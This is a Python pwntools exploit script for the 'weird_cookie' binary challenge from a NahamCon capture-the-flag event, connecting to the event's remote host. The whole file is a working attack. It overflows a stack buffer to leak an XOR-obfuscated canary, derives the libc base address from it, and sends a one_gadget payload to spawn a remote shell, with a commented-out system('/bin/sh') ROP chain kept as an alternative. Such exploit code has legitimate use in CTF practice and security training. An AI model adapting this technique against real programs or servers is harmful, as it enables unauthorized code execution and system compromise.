#!/usr/bin/env python3

from pwn import *

exe = ELF("./weird_cookie")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
buff_size = (0x8 * 0x5)

context.binary = exe

#r = process("./weird_cookie")
#gdb.attach(r)
r = remote("challenge.nahamcon.com", 32735)


r.sendafter(b"Do you think you can overflow me?\n", b"a" * buff_size)
print(r.recv(buff_size))
canary = int.from_bytes(r.recv(8), "little")
printf_addr = canary ^ 0x123456789ABCDEF1 
print(hex(canary), hex(printf_addr))

libc.address = printf_addr - libc.symbols['printf']
ret = libc.address + 0x8aa
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.sym["exit"]
pop_rdi = libc.address + 0x215bf

log.info("ret: "+ str(hex(ret)))
log.info("binsh: "+ str(hex(binsh)))
log.info("system: "+ str(hex(libc_system)))
log.info("exit: "+ str(hex(libc_exit)))
one_gadget1 = libc.address + 0x4f3d5
one_gadget2 = libc.address + 0x4f432
one_gadget3 = libc.address + 0x10a41c

payload = b"\0" * buff_size
payload += p64(canary)
payload += b"\0" * 0x8
payload += p64(one_gadget1)

# payload = b"\0" * buff_size
# payload += p64(canary)
# payload += b"\0" * 0x8
# payload += b"A"*100
# payload += p64(ret)
# payload += p64(pop_rdi)
# payload += p64(binsh)
# payload += p64(libc_system)
# payload += p64(libc_exit) # gracefully :)
"""
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""

print(r.sendafter(b"Are you sure you overflowed it right? Try again.\n", payload))
r.interactive()